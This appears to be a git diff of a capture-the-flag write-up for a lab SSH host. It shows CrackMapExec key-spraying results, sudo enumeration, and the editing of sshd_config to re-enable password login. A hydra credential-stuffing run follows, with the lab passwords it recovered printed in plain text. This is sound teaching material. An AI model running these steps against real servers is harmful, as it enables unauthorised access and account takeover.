@@ -449,7 +449,19 @@ ssh = the service CME is working againts
 -p = passphrase for the id_rsa (if applicable)
 </PRE>
 </details>
-
+  <PRE>
+SSH         10.10.247.86    22     10.10.247.86     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
+SSH         10.10.247.86    22     10.10.247.86     [-] d_wilson: Authentication failed.
+SSH         10.10.247.86    22     10.10.247.86     [-] e_johnson: Authentication failed.
+SSH         10.10.247.86    22     10.10.247.86     [-] j_davis: Authentication failed.
+SSH         10.10.247.86    22     10.10.247.86     [-] j_moore: Authentication failed.
+SSH         10.10.247.86    22     10.10.247.86     [-] j_smith: Authentication failed.
+SSH         10.10.247.86    22     10.10.247.86     [-] m_brown: Authentication failed.
+SSH         10.10.247.86    22     10.10.247.86     [+] net-admin: (keyfile: id_rsa_barbara)  - shell access!
+  </PRE>
+  
+---
+---
 ## Privilege Escalation (MITRE ATT&CK Outline)
 
 | Techniqe ID                 | Name                          | Tool(s) Used                |
@@ -458,8 +470,106 @@ ssh = the service CME is working againts
 | [T1556](https://attack.mitre.org/techniques/T1556/)    | Modify Authentication Process    | /etc/ssh/sshd_config
 | [T1110](https://attack.mitre.org/techniques/T1110/004/)    | Credential Stuffing    | hydra    |
 
+### net-admin, Lateral Movement to sys-admin
+---
 
-### sftp to net-admin
-With valid credentials we can enumerate the sftp service and sift through the documents for pertinent 
-information. There are two particular documents that indicate a likely attack vector. blah blah blah
+#### Enumeration of the net-admin profile  
+**What do we know**:  
+-net-admin has sudo privileges associated to the SSH Service
+```bash
+sudo -l
+```
+<details>
+  <summary>Sudo Privs</summary>
+  <PRE>
+Matching Defaults entries for net-admin on nexora-ssh:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User net-admin may run the following commands on nexora-ssh:
+    (ALL) NOPASSWD: /bin/systemctl restart sshd, /bin/systemctl stop sshd, /bin/systemctl start sshd,
+                    /bin/systemctl status sshd, /usr/bin/vim /etc/ssh/sshd_config
+  </PRE>
+</details>
+
+- The net-admin, and sys-admin profiles do not allow password authentication:
+```bash
+sudo /usr/bin/vim /etc/ssh/sshd_config
+```
+<details>
+  <summary>SSH Match Block Configuration</summary>
+  <pre>
+# Restrict the sftp service 'user'
+Match User sftp
+    ChrootDirectory /home/%u
+    ForceCommand internal-sftp
+    PasswordAuthentication no
+    PubkeyAuthentication yes
+    X11Forwarding no
+    AllowTcpForwarding no
+# Restrict net-admin service to pubkey only, no password login
+Match User net-admin
+    PasswordAuthentication no
+    PubkeyAuthentication yes
+# Restrict sys-admin service to pubkey only, no password login
+Match User sys-admin
+    PasswordAuthentication no
+    PubkeyAuthentication yes    
+  </pre>
+</details>
+
+**What do we have**:
+- The ability to reconfigure the SSH server.
+
+**What can we do**:
+- Conduct a credential stuffing attack by reconfiguring the SSH server match blocks.
+
+##### Conduct a Credential Stuffing Attack
+
+- Step 1: Open the sshd config file using the sudo privileges.
+```bash
+sudo /usr/bin/vim /etc/ssh/sshd_config
+```
+- Step 2: Identify and adjust the password match block for the net-admin, and sys-admin.
+<PRE>
+# Restrict net-admin service to pubkey only, no password login
+Match User net-admin
+    PasswordAuthentication yes
+    PubkeyAuthentication yes
+
+# Restrict sys-admin service to pubkey only, no password login
+Match User sys-admin
+    PasswordAuthentication yes
+    PubkeyAuthentication yes
+</PRE>
+
+- Step 3: Restart the SSHD service
+```bash
+sudo /bin/systemctl restart sshd
+```
+
+- Step 4: Conduct the Credential Stuffing Attack using the same creds from Task 2.
+```bash
+hydra -L users.txt -P breachedCreds.txt $ip ssh
+```
+<PRE>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 01:33:48
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 70 login tries (l:10/p:7), ~5 tries per task
+[DATA] attacking ssh://10.10.247.86:22/
+[22][ssh] host: 10.10.247.86   login: j_moore   password: Unplanned8@Chair
+[22][ssh] host: 10.10.247.86   login: m_brown   password: resetMeAfter1Use!*
+[ERROR] ssh target does not support password auth
+[ERROR] ssh target does not support password auth
+[ERROR] ssh target does not support password auth
+[ERROR] ssh target does not support password auth
+[ERROR] ssh target does not support password auth
+[ERROR] ssh target does not support password auth
+[ERROR] ssh target does not support password auth
+[22][ssh] host: 10.10.247.86   login: sys-admin   password: Driver2$Ideology$Encrypt
+[ERROR] ssh target does not support password auth
+1 of 1 target successfully completed, 3 valid passwords found
+</PRE>
 
